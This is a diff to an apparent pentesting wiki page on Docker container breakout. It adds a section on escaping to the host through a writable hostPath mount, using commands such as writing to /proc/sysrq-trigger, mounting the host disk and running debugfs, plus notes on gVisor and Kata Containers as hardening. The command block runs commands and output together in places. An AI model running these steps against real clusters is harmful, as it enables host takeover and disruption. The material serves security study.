@@ -470,19 +470,51 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 
-## Seccomp in Docker
+## Writable hostPath Mount
+
+\(Info from [**here**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)\) Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:
+
+```bash
+#### Check if You Can Write to a File-system
+$ echo 1 > /proc/sysrq-trigger
+
+#### Check root UUID
+$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
+$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
+$ mkdir /mnt-test
+$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.
+
+#### debugfs (Interactive File System Debugger)
+$ debugfs /dev/sda1
+```
+
+## Containers Security Improvements
+
+### Seccomp in Docker
 
 This is not a technique to breakout from a Docker container but a security feature that Docker uses and you should know about as it might prevent you from breaking out from docker:
 
 {% page-ref page="seccomp.md" %}
 
-## AppArmor in Docker
+### AppArmor in Docker
 
 This is not a technique to breakout from a Docker container but a security feature that Docker uses and you should know about as it might prevent you from breaking out from docker:
 
 {% page-ref page="apparmor.md" %}
 
-## Use containers securely
+### gVisor
+
+**gVisor** is an application kernel, written in Go, that implements a substantial portion of the Linux system surface. It includes an [Open Container Initiative \(OCI\)](https://www.opencontainers.org/) runtime called `runsc` that provides an **isolation boundary between the application and the host kernel**. The `runsc` runtime integrates with Docker and Kubernetes, making it simple to run sandboxed containers.
+
+{% embed url="https://github.com/google/gvisor" %}
+
+## Kata Containers
+
+**Kata Containers** is an open source community working to build a secure container runtime with lightweight virtual machines that feel and perform like containers, but provide **stronger workload isolation using hardware virtualization** technology as a second layer of defense.
+
+{% embed url="https://katacontainers.io/" %}
+
+### Use containers securely
 
 Docker restricts and limits containers by default. Loosening these restrictions may create security issues, even without the full power of the `--privileged` flag. It is important to acknowledge the impact of each additional permission, and limit permissions overall to the minimum necessary.
 
